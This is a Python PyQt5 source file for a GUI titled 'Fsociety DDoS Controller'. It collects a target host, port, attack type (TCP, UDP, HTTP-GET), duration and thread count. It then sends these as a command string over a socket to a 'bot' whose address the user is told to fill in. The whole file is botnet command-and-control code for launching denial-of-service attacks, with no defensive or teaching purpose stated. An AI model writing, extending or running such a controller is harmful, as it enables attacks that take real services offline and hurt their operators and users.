import sys
import socket
import requests
from PyQt5.QtWidgets import (
    QApplication, QWidget, QLabel, QPushButton,
    QVBoxLayout, QHBoxLayout, QLineEdit, QTextEdit, QComboBox, QSpinBox
)
from PyQt5.QtGui import QPixmap, QPalette, QBrush, QFont
from PyQt5.QtCore import Qt
import threading

class GUI(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Fsociety DDoS Controller")
        self.setGeometry(100, 100, 650, 520)

        # Load background image from URL
        image_url = "https://i.pinimg.com/736x/30/b9/46/30b94658f685ffd183c8c442d2973d30.jpg"
        response = requests.get(image_url)
        pixmap = QPixmap()
        pixmap.loadFromData(response.content)
        palette = QPalette()
        palette.setBrush(QPalette.Window, QBrush(pixmap.scaled(self.size(), Qt.IgnoreAspectRatio)))
        self.setPalette(palette)

        # Fonts
        font = QFont("Courier", 10, QFont.Bold)
        label_font = QFont("Courier", 12, QFont.Bold)

        # Target input
        self.target_input = QLineEdit()
        self.target_input.setPlaceholderText("Target IP or Domain")
        self.target_input.setFont(font)

        # Port input
        self.port_input = QLineEdit()
        self.port_input.setPlaceholderText("Port (e.g. 80)")
        self.port_input.setFont(font)

        # Attack ID input
        self.attack_id_input = QLineEdit()
        self.attack_id_input.setPlaceholderText("Attack ID")
        self.attack_id_input.setFont(font)

        # Attack type combo
        self.attack_type_combo = QComboBox()
        self.attack_type_combo.setFont(font)
        self.attack_type_combo.addItems(["TCP", "UDP", "HTTP-GET"])

        # Duration input (seconds)
        self.duration_input = QSpinBox()
        self.duration_input.setRange(1, 3600)
        self.duration_input.setValue(15)
        self.duration_input.setFont(font)

        # Threads input
        self.threads_input = QSpinBox()
        self.threads_input.setRange(1, 1000)
        self.threads_input.setValue(100)
        self.threads_input.setFont(font)

        # Start button
        self.start_btn = QPushButton("Launch Attack")
        self.start_btn.setFont(label_font)
        self.start_btn.clicked.connect(self.start_attack)

        # Status box
        self.status_box = QTextEdit()
        self.status_box.setFont(font)
        self.status_box.setReadOnly(True)
        self.status_box.setStyleSheet("background-color: #191919; color: red;")

        # Layout setup
        layout = QVBoxLayout()
        layout.addWidget(QLabel("Target:"))
        layout.addWidget(self.target_input)
        layout.addWidget(QLabel("Port:"))
        layout.addWidget(self.port_input)
        layout.addWidget(QLabel("Attack ID:"))
        layout.addWidget(self.attack_id_input)

        # Attack type horizontal layout
        h_layout1 = QHBoxLayout()
        h_layout1.addWidget(QLabel("Attack Type:"))
        h_layout1.addWidget(self.attack_type_combo)
        h_layout1.addWidget(QLabel("Duration (sec):"))
        h_layout1.addWidget(self.duration_input)
        layout.addLayout(h_layout1)

        # Threads layout
        h_layout2 = QHBoxLayout()
        h_layout2.addWidget(QLabel("Threads:"))
        h_layout2.addWidget(self.threads_input)
        layout.addLayout(h_layout2)

        layout.addWidget(self.start_btn)
        layout.addWidget(QLabel("Status Log:"))
        layout.addWidget(self.status_box)

        self.setLayout(layout)

    def start_attack(self):
        target = self.target_input.text().strip()
        port = self.port_input.text().strip()
        attack_id = self.attack_id_input.text().strip()
        attack_type = self.attack_type_combo.currentText()
        duration = self.duration_input.value()
        threads = self.threads_input.value()

        if not target or not port or not attack_id:
            self.status_box.append("❌ Please fill all required fields!")
            return

        if not port.isdigit() or int(port) < 1 or int(port) > 65535:
            self.status_box.append("❌ Port must be an integer between 1 and 65535!")
            return

        # Send command string format:
        # ID|TYPE|TARGET|PORT|DURATION|THREADS
        command = f"{attack_id}|{attack_type}|{target}|{port}|{duration}|{threads}"
        self.status_box.append(f"🚀 Sending command: {command}")

        # Start thread so GUI doesn't freeze
        threading.Thread(target=self.send_command_to_bot, args=(command,), daemon=True).start()

    def send_command_to_bot(self, command):
        try:
            sock = socket.socket()
            sock.settimeout(5)
            sock.connect(("0.0.0.0", 9999))  # TODO: Replace with your bot IP or hostname
            sock.send(command.encode())
            sock.close()
            self.status_box.append("✅ Command sent successfully.")
        except Exception as e:
            self.status_box.append(f"❌ Failed to send command: {e}")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = GUI()
    window.show()
    sys.exit(app.exec_())
